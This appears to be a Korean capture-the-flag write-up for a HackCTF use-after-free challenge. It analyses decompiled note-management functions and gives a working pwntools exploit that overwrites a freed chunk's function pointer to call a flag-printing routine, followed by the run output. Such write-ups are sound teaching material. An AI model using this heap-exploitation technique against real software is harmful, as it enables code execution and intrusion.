# UAF

```c
kimdong@ubuntu  ~/Wargame/300~350  file uaf
uaf: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=1c86a6472d09e6a31ca5c0318e28d2b52f77fd52, not stripped

kimdong@ubuntu  ~/Wargame/300~350  checksec uaf
[*] '/home/kimdong/Wargame/300~350/uaf'
   Arch:     i386-32-little
   RELRO:    Partial RELRO
   Stack:    Canary found
   NX:       NX enabled
   PIE:      No PIE (0x8048000)
```
이번 바이너리파일은 32-bit로 NX-bit와 추가적으로 Canary가 설정되어있다.<br>

따라서, shellcode를 입력하거나, BOF취약점을 사용하기는 어려울것 같다.<br>

```c
kimdong@ubuntu  ~/Wargame/300~350  ./uaf
----------------------
       U-A-F         
☆★ 종현이와 함께하는★☆
★☆  엉덩이 공부 ☆★    
----------------------
1. 노트 추가          
2. 노트 삭제       
3. 노트 출력        
4. 탈출              
----------------------
입력 :
```
실행시켜보면 다음과 같이 문자열과 선택지가 나오는데, 예상으로는 노트를 추가하고 삭제한뒤에 출력을 하면 `UAF`취약점이 발생하지 않을까 한다.<br>

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v5; // [esp+Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      read(0, &buf, 4u);
      v3 = atoi(&buf);
      if ( v3 != 2 )
        break;
      del_note();
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        print_note();
      }
      else
      {
        if ( v3 == 4 )
          exit(0);
LABEL_13:
        puts(&byte_8048D08);
      }
    }
    else
    {
      if ( v3 != 1 )
        goto LABEL_13;
      add_note();
    }
  }
}
```
main문은 다음과 같다.<br>

이중에서 `del_note`,`print_note`,`add_note`를 중점적으로 보자.<br>

```c
unsigned int add_note()
{
  _DWORD *v0; // ebx
  signed int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf; // [esp+14h] [ebp-14h]
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( count <= 5 )
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !notelist[i] )
      {
        notelist[i] = malloc(8u);
        if ( !notelist[i] )
        {
          puts(aAllocate);
          exit(-1);
        }
        *(_DWORD *)notelist[i] = print_note_content;
        printf(&format);
        read(0, &buf, 8u);
        size = atoi(&buf);
        v0 = notelist[i];
        v0[1] = malloc(size);
        if ( !*((_DWORD *)notelist[i] + 1) )
        {
          puts(aAllocate);
          exit(-1);
        }
        printf(&byte_8048BC5);
        read(0, *((void **)notelist[i] + 1), size);
        puts(&byte_8048BCE);
        ++count;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ v5;
}
```

```c
notelist[i] = malloc(8u);
```
`add_note`는 다음과 같은데, notelist를 0부터 4까지 받고, `notelist`에 8바이트의 힙 청크를 할당한다.<br>


```c
*(_DWORD *)notelist[i] = print_note_content;
```
할당된 notelist의 주소지에 print_note_content 함수의 포인터를 저장한다.<br>

그후에 사용자를 통해 `size`를 입력받는다.<br>

그 후에 v0[1]의 위치에 size크기의 힙을 할당한다.<br>


```c
unsigned int del_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts(&byte_8048BE0);
    _exit(0);
  }
  if ( notelist[v1] )
  {
    free(*((void **)notelist[v1] + 1));
    free(notelist[v1]);
    puts(&byte_8048BCE);
  }
  return __readgsdword(0x14u) ^ v3;
}
```
del_note에서는 위에서 할당해주었던 notelist를 free시켜준다.<br>

하지만 free된 포인터를 삭제하는 루틴이 없다.<br>

따라서 기존에 할당 해제 되었던 청크를 사용할수있을 것이다.<br>

```c
unsigned int print_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts(&byte_8048BE0);
    _exit(0);
  }
  if ( notelist[v1] )
    (*(void (__cdecl **)(void *))notelist[v1])(notelist[v1]);
  return __readgsdword(0x14u) ^ v3;
}
```
`print_note`에서는  notelist를 참조하여 출력해주는 함수이다.<br>
이 부분에서 notelist의 포인터를 호출하는데, 할당 해제가 된 포인터인지 검증을 하지 않기때문에, 이 부분을 조작하면 다른 함수로 호출이 되도록 할수있다.<br>

```c
int magic()
{
  return system("cat /home/uaf/flag");
}
```
magic이라는 함수는 flag를 띄워주는 함수로 보인다.<br>

따라서, print_note의 주소값을 flag함수로 바꾼뒤 print_note를 호출하면, flag함수가 호출될것으로 보인다.<br>

---

# Exploit Code

```c

from pwn import *

p = remote("ctf.j0n9hyun.xyz",3020)
def add_note(size,content):
    p.recv()
    p.sendline("1")
    p.recv()
    p.sendline(size)
    p.recv()
    p.sendline(content)

def del_note(index):
    p.recv()
    p.sendline("2")
    p.recv()
    p.sendline(index)

def p_note(index):
    p.recv()
    p.sendline("3")
    p.recv()
    p.sendline(index)

magic = 0x08048986

add_note("16","")
add_note("16","")
del_note("0")
del_note("1")

add_note("8",p32(magic))
p_note("0")
p.interactive()

```

```c
⚡ root@ubuntu  ~/Wargame/300~350  python uaf_ex.py
[+] Opening connection to ctf.j0n9hyun.xyz on port 3020: Done
[*] Switching to interactive mode

Index :HackCTF{}

[*] Interrupted
[*] Closed connection to ctf.j0n9hyun.xyz port 3020

```

## END !
